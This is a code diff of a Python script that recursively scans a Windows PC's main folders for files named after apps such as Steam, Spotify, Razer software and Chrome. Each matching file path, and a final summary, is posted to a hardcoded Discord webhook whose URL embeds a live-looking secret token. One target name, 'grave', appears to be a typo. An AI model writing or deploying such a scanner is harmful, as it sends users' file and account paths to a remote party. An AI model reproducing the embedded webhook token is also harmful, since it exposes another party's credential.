@@ -1,89 +1,74 @@
 import os
 import requests
-import datetime
-import traceback
+import logging
+from datetime import datetime
 
-# Define webhooks
-webhooks = {
-    'process_traces': 'https://canary.discord.com/api/webhooks/1279148419193114694/l4pr5CEMMlD4LDsZ9_plYFSfTgWCVvWqXCN9Gri6XVq8bRL55GZtgNZXGOU1TrY34SCV',
-    'error': 'https://canary.discord.com/api/webhooks/1279188293438799902/S3ejH4YpQBv-7Yp4TfW8LCezK-UpzVxolIwdcX66uN-DQZ2DiXt-X2QdeL2mM9ky5Siz'
-}
-
-specific_files = [
-    'steam.exe',
-    'Spotify.exe',
-    'RazerCortex.exe',
-    'RazerSynapse.exe',
-    'lghub.exe',
-    'chrome.exe',
-    'TikTokLIVEStudio.exe',
-    'voicemeeterpro.exe',
-    'brave.exe'
+# Configuration
+WEBHOOK_URL = 'https://canary.discord.com/api/webhooks/1279148419193114694/l4pr5CEMMlD4LDsZ9_plYFSfTgWCVvWqXCN9Gri6XVq8bRL55GZtgNZXGOU1TrY34SCV'
+TARGET_PROCESSES = [
+    'LGHUB', 'TikTokLIVEStudio', 'voicemeeterpro', 'grave',
+    'RazerCortex', 'RazerSynapse', 'spotify', 'steam', 'chrome', 'brave'
 ]
 
-def send_webhook(url, content):
+# Logging setup
+logging.basicConfig(filename='script_log.txt', level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
+
+def send_webhook(message):
+    """Send a message to the Discord webhook."""
     try:
-        response = requests.post(url, json={"content": content})
+        data = {'content': message}
+        response = requests.post(WEBHOOK_URL, json=data)
         response.raise_for_status()
-    except requests.RequestException as e:
+    except requests.exceptions.RequestException as e:
+        logging.error(f"Failed to send webhook: {e}")
         print(f"Failed to send webhook: {e}")
 
-def scan_directory(directory, found_files):
-    try:
-        for root, dirs, files in os.walk(directory):
-            for file in files:
-                filepath = os.path.join(root, file)
-                if file in specific_files:
-                    found_files.append(filepath)
-                    send_webhook(webhooks['process_traces'], f"Found {file} in {filepath}")
-            for dir in dirs:
-                scan_directory(os.path.join(root, dir), found_files)
-    except Exception as e:
-        print(f"Error scanning directory {directory}: {e}")
-
-def main():
-    start_time = datetime.datetime.now()
+def scan_folder(folder_path):
+    """Scan a folder and report findings."""
     found_files = []
-
-    directories_to_scan = [
-        'C:\\',
-        os.path.expandvars(r'%APPDATA%'),
-        os.path.expandvars(r'%LOCALAPPDATA%'),
-        os.path.expandvars(r'%ProgramFiles%'),
-        os.path.expandvars(r'%ProgramFiles(x86)%'),
-        os.path.expandvars(r'%SystemRoot%\\System32'),
-        os.path.expandvars(r'%SystemRoot%\\SysWOW64')
-    ]
-
-    for directory in directories_to_scan:
-        scan_directory(directory, found_files)
-
-    # Reporting
-    if not found_files:
-        send_webhook(webhooks['process_traces'], "No target processes found.")
-    else:
-        send_webhook(webhooks['process_traces'], f"Found traces: {', '.join(found_files)}")
-
-    # Logging results
-    with open('results.txt', 'w') as f:
-        if found_files:
-            f.write(f"Found traces:\n{', '.join(found_files)}\n")
-        else:
-            f.write("No target processes found.\n")
-    
-    end_time = datetime.datetime.now()
-    duration = end_time - start_time
-
-    # Error handling
     try:
-        if found_files:
-            send_webhook(webhooks['process_traces'], "Scanning complete. Check results.txt for details.")
-        else:
-            send_webhook(webhooks['process_traces'], "Scanning complete. No traces found. Check results.txt for details.")
+        for root, dirs, files in os.walk(folder_path):
+            for file in files:
+                file_path = os.path.join(root, file)
+                # Check for target processes in the filenames
+                if any(proc.lower() in file.lower() for proc in TARGET_PROCESSES):
+                    found_files.append(file_path)
+                    print(f"\033[91mFound trace: {file_path}\033[0m")
+                    send_webhook(f"Found trace: {file_path}")
+                    
     except Exception as e:
-        send_webhook(webhooks['error'], f"Error occurred: {e}")
-        with open('error_log.txt', 'w') as f:
-            f.write(f"Error occurred: {e}\n")
+        logging.error(f"Error scanning folder {folder_path}: {e}")
+        print(f"Error scanning folder {folder_path}: {e}")
+    
+    return found_files
+
+def deep_scan():
+    """Perform a deep scan of the entire PC."""
+    directories_to_scan = [
+        'C:\\', 
+        os.path.join(os.getenv('APPDATA')), 
+        os.path.join(os.getenv('LOCALAPPDATA')), 
+        os.path.join(os.getenv('PROGRAMDATA')),
+        'C:\\Windows\\System32'
+    ]
+    
+    all_found_files = []
+    for directory in directories_to_scan:
+        print(f"Scanning through folder {directory}")
+        found_files = scan_folder(directory)
+        if found_files:
+            all_found_files.extend(found_files)
+        else:
+            print(f"\033[92mScanning through folder {directory} - Clear\033[0m")
+    
+    if all_found_files:
+        send_webhook(f"Scanning complete. Found traces in: {', '.join(all_found_files)}")
+    else:
+        send_webhook("Scanning complete. No traces found.")
 
 if __name__ == "__main__":
-    main()
+    print("Scanning PC...")
+    start_time = datetime.now()
+    deep_scan()
+    end_time = datetime.now()
+    print(f"Scanning complete. Duration: {end_time - start_time}")
